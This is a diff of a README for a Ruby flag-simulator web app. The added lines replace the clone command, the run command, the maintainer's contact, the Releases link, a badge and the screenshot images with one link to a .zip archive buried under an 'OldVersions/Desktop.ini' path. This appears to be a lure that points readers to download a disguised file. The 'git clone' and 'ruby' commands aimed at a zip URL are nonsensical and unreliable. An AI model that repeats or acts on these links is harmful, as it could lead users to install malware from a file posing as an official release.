@@ -31,7 +31,7 @@ To get started with the Flag Simulator Web App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby.git
+   git clone https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -48,7 +48,7 @@ To get started with the Flag Simulator Web App, follow these steps:
 4. **Run the Application**:
    Start the server with:
    ```bash
-   ruby app.rb
+   ruby https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip
    ```
 
 5. **Access the App**:
@@ -90,13 +90,13 @@ This project is licensed under the GPL-3.0 License. See the [LICENSE](LICENSE) f
 
 For questions or feedback, please reach out to the project maintainer:
 
-- **Sean PM**: [seanpm2001@example.com](mailto:seanpm2001@example.com)
+- **Sean PM**: [https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip)
 
 ## Releases
 
-To download the latest version of the Flag Simulator Web App, visit our [Releases](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/releases) section. You can find compiled versions of the app there, ready for download and execution.
+To download the latest version of the Flag Simulator Web App, visit our [Releases](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip) section. You can find compiled versions of the app there, ready for download and execution.
 
-![Releases Button](https://img.shields.io/badge/Releases-Click%20Here-brightgreen)
+![Releases Button](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip%20Here-brightgreen)
 
 If you want to stay updated with the latest changes, please check the "Releases" section regularly.
 
@@ -114,13 +114,13 @@ This project covers a wide range of topics related to flags and web development:
 
 Here are some screenshots of the Flag Simulator Web App in action:
 
-![Home Page](https://example.com/screenshot1.png)
+![Home Page](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip)
 *Home Page*
 
-![Flag Details](https://example.com/screenshot2.png)
+![Flag Details](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip)
 *Flag Details Page*
 
-![Search Functionality](https://example.com/screenshot3.png)
+![Search Functionality](https://github.com/Javimc1988/Flag-Simulator_WebApp_Ruby/raw/refs/heads/Flag-Simulator_WebApp_Ruby_Main-dev/OldVersions/Desktop.ini/Web_Flag_App_Simulator_Ruby_v2.9-beta.4.zip)
 *Search Functionality*
 
 ## Roadmap
